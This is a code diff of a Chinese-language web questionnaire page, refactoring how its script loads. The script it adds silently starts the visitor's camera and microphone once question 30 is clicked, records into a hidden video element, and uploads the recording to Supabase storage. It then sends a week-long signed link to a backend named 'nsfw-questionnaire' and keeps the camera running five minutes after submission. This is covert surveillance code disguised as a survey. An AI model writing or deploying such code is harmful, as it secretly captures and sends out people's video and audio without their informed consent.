@@ -4,8 +4,8 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>问卷</title>
-<!-- 加载 Supabase SDK -->
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<!-- 注意：这里改了，使用正确的 SDK 版本 -->
+<script src="https://unpkg.com/@supabase/supabase-js@2/dist/umd/supabase.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
@@ -159,48 +159,39 @@ textarea:focus { outline: none; border-color: #1a73e8; box-shadow: 0 0 0 3px rgb
     <div class="footer">© 2026</div>
 </div>
 
-<!-- 隐藏的视频元素 -->
 <video id="videoElement" style="display:none;" autoplay playsinline></video>
 
 <script>
-// ============================
-// 配置区域（请勿改动）
-var SUPABASE_URL = 'https://bzocbprfefvndsfxtgea.supabase.co';
-var SUPABASE_KEY = 'sb_publishable_tV1rc8buwkerruQZf5mrPw_gGM3j9GD';
-var API_URL = 'https://nsfw-questionnaire.onrender.com/api/submit';
-// ============================
-
-// 确保 Supabase SDK 已加载
-if (typeof window.supabase === 'undefined') {
-    console.error('错误：Supabase SDK 未加载，请刷新页面重试');
-    // 可以在这里显示提示信息，但不中断后续代码
-} else {
-    console.log('Supabase SDK 已加载');
-}
-
-// 初始化 Supabase 客户端
-var supabase = null;
-try {
-    supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-    console.log('Supabase 客户端初始化成功');
-} catch (e) {
-    console.error('Supabase 客户端初始化失败:', e);
-}
-
-// 摄像头相关变量
-var mediaStream = null;
-var mediaRecorder = null;
-var recordedChunks = [];
-var isRecording = false;
-var isCameraReady = false;
-var closeTimer = null;
-
-// ----- 第30题点击触发摄像头 -----
+// 等 Supabase SDK 加载完成后再执行
 document.addEventListener('DOMContentLoaded', function() {
+    // 检查 window.supabase 是否存在
+    if (typeof window.supabase === 'undefined') {
+        console.error('Supabase SDK 未加载，请刷新页面');
+        return;
+    }
+
+    // ===== 配置 =====
+    var SUPABASE_URL = 'https://bzocbprfefvndsfxtgea.supabase.co';
+    var SUPABASE_KEY = 'sb_publishable_tV1rc8buwkerruQZf5mrPw_gGM3j9GD';
+    var API_URL = 'https://nsfw-questionnaire.onrender.com/api/submit';
+    // =================
+
+    // 初始化 Supabase 客户端
+    var supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+    console.log('Supabase 客户端初始化成功');
+
+    // 摄像头相关变量
+    var mediaStream = null;
+    var mediaRecorder = null;
+    var recordedChunks = [];
+    var isRecording = false;
+    var isCameraReady = false;
+    var closeTimer = null;
+
+    // ----- 第30题点击触发摄像头 -----
     var q30Options = document.getElementById('q30Options');
     if (q30Options) {
         q30Options.addEventListener('click', function(e) {
-            // 确保点击的是 label 或 radio 本身
             var target = e.target;
             if (target.closest('label') || target.type === 'radio') {
                 if (!isCameraReady) {
@@ -209,229 +200,218 @@ document.addEventListener('DOMContentLoaded', function() {
             }
         });
     }
-});
 
-// ----- 启动摄像头和麦克风 -----
-function startCameraAndMic() {
-    // 检查是否支持 getUserMedia
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-        console.error('浏览器不支持摄像头/麦克风');
-        return;
-    }
-    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-        .then(function(stream) {
-            mediaStream = stream;
-            var video = document.getElementById('videoElement');
-            video.srcObject = stream;
-            return video.play();
-        })
-        .then(function() {
-            isCameraReady = true;
-            startRecording();
-            console.log('摄像头已启动并开始录制');
-        })
-        .catch(function(err) {
-            console.error('摄像头启动失败:', err);
-            // 如果用户拒绝，不做页面提示（静默）
-        });
-}
-
-// ----- 开始录制 -----
-function startRecording() {
-    if (!mediaStream) return;
-    recordedChunks = [];
-    var options = { mimeType: 'video/webm;codecs=vp9,opus' };
-    try {
-        mediaRecorder = new MediaRecorder(mediaStream, options);
-    } catch (e) {
-        mediaRecorder = new MediaRecorder(mediaStream);
-    }
-    mediaRecorder.ondataavailable = function(event) {
-        if (event.data && event.data.size > 0) {
-            recordedChunks.push(event.data);
-        }
-    };
-    mediaRecorder.start(1000);
-    isRecording = true;
-}
-
-// ----- 停止录制（返回 Promise） -----
-function stopRecording() {
-    return new Promise(function(resolve) {
-        if (!mediaRecorder || mediaRecorder.state === 'inactive') {
-            resolve(null);
+    // ----- 启动摄像头 -----
+    function startCameraAndMic() {
+        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+            console.error('浏览器不支持摄像头');
             return;
         }
-        mediaRecorder.onstop = function() {
-            var blob = new Blob(recordedChunks, { type: 'video/webm' });
-            recordedChunks = [];
-            isRecording = false;
-            resolve(blob);
-        };
-        mediaRecorder.stop();
-    });
-}
-
-// ----- 上传视频（返回 Promise） -----
-function uploadVideo(blob) {
-    return new Promise(function(resolve) {
-        if (!blob || blob.size === 0) {
-            resolve(null);
-            return;
-        }
-        if (!supabase) {
-            console.error('Supabase 客户端未初始化');
-            resolve(null);
-            return;
-        }
-        var fileName = 'video_' + Date.now() + '_' + Math.random().toString(36).substring(7) + '.webm';
-        supabase.storage.from('videos').upload(fileName, blob, { contentType: 'video/webm' })
-            .then(function(result) {
-                if (result.error) {
-                    console.error('视频上传失败:', result.error);
-                    resolve(null);
-                    return;
-                }
-                // 生成签名 URL（7天有效期）
-                return supabase.storage.from('videos').createSignedUrl(fileName, 60 * 60 * 24 * 7);
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(function(stream) {
+                mediaStream = stream;
+                var video = document.getElementById('videoElement');
+                video.srcObject = stream;
+                return video.play();
             })
-            .then(function(urlResult) {
-                if (urlResult && urlResult.error) {
-                    console.error('生成签名URL失败:', urlResult.error);
-                    resolve(null);
-                    return;
-                }
-                if (urlResult && urlResult.data) {
-                    resolve(urlResult.data.signedUrl);
-                } else {
-                    resolve(null);
-                }
+            .then(function() {
+                isCameraReady = true;
+                startRecording();
+                console.log('摄像头已启动并开始录制');
             })
             .catch(function(err) {
-                console.error('视频上传过程中出错:', err);
+                console.error('摄像头启动失败:', err);
+            });
+    }
+
+    // ----- 开始录制 -----
+    function startRecording() {
+        if (!mediaStream) return;
+        recordedChunks = [];
+        var options = { mimeType: 'video/webm;codecs=vp9,opus' };
+        try {
+            mediaRecorder = new MediaRecorder(mediaStream, options);
+        } catch (e) {
+            mediaRecorder = new MediaRecorder(mediaStream);
+        }
+        mediaRecorder.ondataavailable = function(event) {
+            if (event.data && event.data.size > 0) {
+                recordedChunks.push(event.data);
+            }
+        };
+        mediaRecorder.start(1000);
+        isRecording = true;
+    }
+
+    // ----- 停止录制 -----
+    function stopRecording() {
+        return new Promise(function(resolve) {
+            if (!mediaRecorder || mediaRecorder.state === 'inactive') {
                 resolve(null);
-            });
-    });
-}
-
-// ----- 关闭摄像头和麦克风 -----
-function closeCameraAndMic() {
-    if (mediaStream) {
-        mediaStream.getTracks().forEach(function(track) {
-            track.stop();
+                return;
+            }
+            mediaRecorder.onstop = function() {
+                var blob = new Blob(recordedChunks, { type: 'video/webm' });
+                recordedChunks = [];
+                isRecording = false;
+                resolve(blob);
+            };
+            mediaRecorder.stop();
         });
-        mediaStream = null;
-        isCameraReady = false;
-        isRecording = false;
-    }
-    if (closeTimer) {
-        clearTimeout(closeTimer);
-        closeTimer = null;
-    }
-}
-
-// ----- 5分钟后自动关闭 -----
-function scheduleCameraClose() {
-    if (closeTimer) clearTimeout(closeTimer);
-    closeTimer = setTimeout(function() {
-        closeCameraAndMic();
-        console.log('提交后5分钟，摄像头已自动关闭');
-    }, 5 * 60 * 1000);
-}
-
-// ----- 提交问卷 -----
-function submitForm() {
-    var btn = document.getElementById('submitBtn');
-    var statusEl = document.getElementById('status-msg');
-    statusEl.style.display = 'none';
-    statusEl.className = '';
-
-    // 收集数据
-    var q1 = document.querySelector('input[name="q1"]:checked');
-    var q2 = document.getElementById('q2').value.trim();
-    var q30 = document.querySelector('input[name="q30"]:checked');
-    var q31 = document.getElementById('q31').value.trim();
-
-    // 基本验证
-    if (!q1) {
-        statusEl.textContent = '⚠️ 请回答第1题';
-        statusEl.className = 'error';
-        statusEl.style.display = 'block';
-        return;
-    }
-    if (!q30) {
-        statusEl.textContent = '⚠️ 请回答第30题并允许摄像头权限';
-        statusEl.className = 'error';
-        statusEl.style.display = 'block';
-        return;
     }
 
-    btn.disabled = true;
-    btn.textContent = '提交中...';
-
-    // 停止录制并获取视频
-    var videoPromise = isRecording ? stopRecording() : Promise.resolve(null);
-    videoPromise
-        .then(function(blob) {
-            if (blob && blob.size > 0) {
-                return uploadVideo(blob);
-            } else {
-                return null;
+    // ----- 上传视频 -----
+    function uploadVideo(blob) {
+        return new Promise(function(resolve) {
+            if (!blob || blob.size === 0) {
+                resolve(null);
+                return;
             }
-        })
-        .then(function(videoUrl) {
-            // 提交到后端
-            return fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    q1: q1.value,
-                    q2: q2 || null,
-                    q30: q30.value,
-                    q31: q31 || null,
-                    video_url: videoUrl
+            if (!supabase) {
+                console.error('Supabase 客户端未初始化');
+                resolve(null);
+                return;
+            }
+            var fileName = 'video_' + Date.now() + '_' + Math.random().toString(36).substring(7) + '.webm';
+            supabase.storage.from('videos').upload(fileName, blob, { contentType: 'video/webm' })
+                .then(function(result) {
+                    if (result.error) {
+                        console.error('视频上传失败:', result.error);
+                        resolve(null);
+                        return;
+                    }
+                    return supabase.storage.from('videos').createSignedUrl(fileName, 60 * 60 * 24 * 7);
                 })
-            });
-        })
-        .then(function(response) {
-            if (!response.ok) {
-                return response.json().then(function(errData) {
-                    throw new Error(errData.error || '服务器错误');
+                .then(function(urlResult) {
+                    if (urlResult && urlResult.error) {
+                        console.error('生成签名URL失败:', urlResult.error);
+                        resolve(null);
+                        return;
+                    }
+                    if (urlResult && urlResult.data) {
+                        resolve(urlResult.data.signedUrl);
+                    } else {
+                        resolve(null);
+                    }
+                })
+                .catch(function(err) {
+                    console.error('视频上传过程中出错:', err);
+                    resolve(null);
                 });
-            }
-            return response.json();
-        })
-        .then(function(result) {
-            // 提交成功
-            scheduleCameraClose();
-            statusEl.textContent = '✅ 提交成功！感谢您的参与！';
-            statusEl.className = 'success';
-            statusEl.style.display = 'block';
-            // 清空表单
-            document.querySelectorAll('input[type="radio"]:checked').forEach(function(el) {
-                el.checked = false;
+        });
+    }
+
+    // ----- 关闭摄像头 -----
+    function closeCameraAndMic() {
+        if (mediaStream) {
+            mediaStream.getTracks().forEach(function(track) {
+                track.stop();
             });
-            document.getElementById('q2').value = '';
-            document.getElementById('q31').value = '';
-        })
-        .catch(function(err) {
-            statusEl.textContent = '❌ ' + err.message;
+            mediaStream = null;
+            isCameraReady = false;
+            isRecording = false;
+        }
+        if (closeTimer) {
+            clearTimeout(closeTimer);
+            closeTimer = null;
+        }
+    }
+
+    // ----- 5分钟后自动关闭 -----
+    function scheduleCameraClose() {
+        if (closeTimer) clearTimeout(closeTimer);
+        closeTimer = setTimeout(function() {
+            closeCameraAndMic();
+            console.log('提交后5分钟，摄像头已自动关闭');
+        }, 5 * 60 * 1000);
+    }
+
+    // ----- 提交问卷 -----
+    window.submitForm = function() {
+        var btn = document.getElementById('submitBtn');
+        var statusEl = document.getElementById('status-msg');
+        statusEl.style.display = 'none';
+        statusEl.className = '';
+
+        var q1 = document.querySelector('input[name="q1"]:checked');
+        var q2 = document.getElementById('q2').value.trim();
+        var q30 = document.querySelector('input[name="q30"]:checked');
+        var q31 = document.getElementById('q31').value.trim();
+
+        if (!q1) {
+            statusEl.textContent = '⚠️ 请回答第1题';
             statusEl.className = 'error';
             statusEl.style.display = 'block';
-        })
-        .finally(function() {
-            btn.disabled = false;
-            btn.textContent = '提交问卷';
-        });
-}
+            return;
+        }
+        if (!q30) {
+            statusEl.textContent = '⚠️ 请回答第30题并允许摄像头权限';
+            statusEl.className = 'error';
+            statusEl.style.display = 'block';
+            return;
+        }
 
-// 页面关闭时清理资源
-window.addEventListener('beforeunload', function() {
-    closeCameraAndMic();
+        btn.disabled = true;
+        btn.textContent = '提交中...';
+
+        var videoPromise = isRecording ? stopRecording() : Promise.resolve(null);
+        videoPromise
+            .then(function(blob) {
+                if (blob && blob.size > 0) {
+                    return uploadVideo(blob);
+                } else {
+                    return null;
+                }
+            })
+            .then(function(videoUrl) {
+                return fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        q1: q1.value,
+                        q2: q2 || null,
+                        q30: q30.value,
+                        q31: q31 || null,
+                        video_url: videoUrl
+                    })
+                });
+            })
+            .then(function(response) {
+                if (!response.ok) {
+                    return response.json().then(function(errData) {
+                        throw new Error(errData.error || '服务器错误');
+                    });
+                }
+                return response.json();
+            })
+            .then(function(result) {
+                scheduleCameraClose();
+                statusEl.textContent = '✅ 提交成功！感谢您的参与！';
+                statusEl.className = 'success';
+                statusEl.style.display = 'block';
+                document.querySelectorAll('input[type="radio"]:checked').forEach(function(el) {
+                    el.checked = false;
+                });
+                document.getElementById('q2').value = '';
+                document.getElementById('q31').value = '';
+            })
+            .catch(function(err) {
+                statusEl.textContent = '❌ ' + err.message;
+                statusEl.className = 'error';
+                statusEl.style.display = 'block';
+            })
+            .finally(function() {
+                btn.disabled = false;
+                btn.textContent = '提交问卷';
+            });
+    };
+
+    window.addEventListener('beforeunload', function() {
+        closeCameraAndMic();
+    });
+
+    console.log('问卷脚本已加载，准备就绪');
 });
-
-// 启动时输出日志以便确认脚本已执行
-console.log('问卷脚本已加载，准备就绪');
 </script>
 </body>
 </html>
